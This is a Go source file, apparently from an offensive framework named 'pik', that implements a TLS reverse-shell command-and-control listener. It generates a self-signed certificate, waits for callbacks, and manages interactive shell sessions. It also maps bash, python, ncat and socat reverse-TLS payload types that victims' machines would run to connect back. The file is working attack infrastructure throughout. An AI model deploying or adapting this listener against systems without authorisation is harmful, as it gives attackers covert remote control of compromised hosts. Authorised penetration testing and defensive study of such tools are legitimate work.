package sslshell

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"time"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/c2/session"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
)

func init() {
	c2.RegisterFactory("sslshell", func(_ string) c2.Backend { return New() })
}

// Listener is a TLS reverse shell listener.
type Listener struct {
	manager *session.Manager
	lhost   string
	lport   int
}

var payloads = c2.PayloadMap{
	"cmd/bash/reverse_tls":   payload.BashTLS,
	"cmd/python/reverse_tls": payload.PythonTLS,
	"cmd/ncat/reverse_tls":   payload.NcatTLS,
	"cmd/socat/reverse_tls":  payload.SocatTLS,
}

func New() *Listener { return &Listener{} }

func (l *Listener) Name() string { return "sslshell" }

func (l *Listener) Setup(lhost string, lport int) error {
	l.lhost = lhost
	l.lport = lport

	cert, err := selfSignedCert(lhost)
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %w", err)
	}

	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := tls.Listen("tcp", fmt.Sprintf("%s:%d", lhost, lport), tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to start TLS listener: %w", err)
	}

	l.manager = session.NewManager(ln)
	l.manager.Start()
	output.Status("TLS listening on %s:%d", lhost, lport)
	return nil
}

func (l *Listener) GeneratePayload(_, payloadType string) (string, error) {
	return c2.ResolvePayload(payloads, l.lhost, l.lport, payloadType, payload.BashTLS)
}

func (l *Listener) WaitForSession(timeout time.Duration) error {
	_, err := l.manager.Accept(timeout)
	if err != nil {
		return fmt.Errorf("no session received: %w", err)
	}
	return nil
}

func (l *Listener) Sessions() []*session.Session { return l.manager.List() }
func (l *Listener) Interact(id int) error         { return l.manager.Interact(id) }
func (l *Listener) Kill(id int) error              { return l.manager.Kill(id) }

func (l *Listener) Shutdown() error {
	if l.manager != nil {
		l.manager.Close()
	}
	return nil
}

func selfSignedCert(host string) (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{Organization: []string{"Pik"}},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	if ip := net.ParseIP(host); ip != nil {
		tmpl.IPAddresses = []net.IP{ip}
	} else {
		tmpl.DNSNames = []string{host}
	}

	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}

	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return tls.X509KeyPair(certPEM, keyPEM)
}
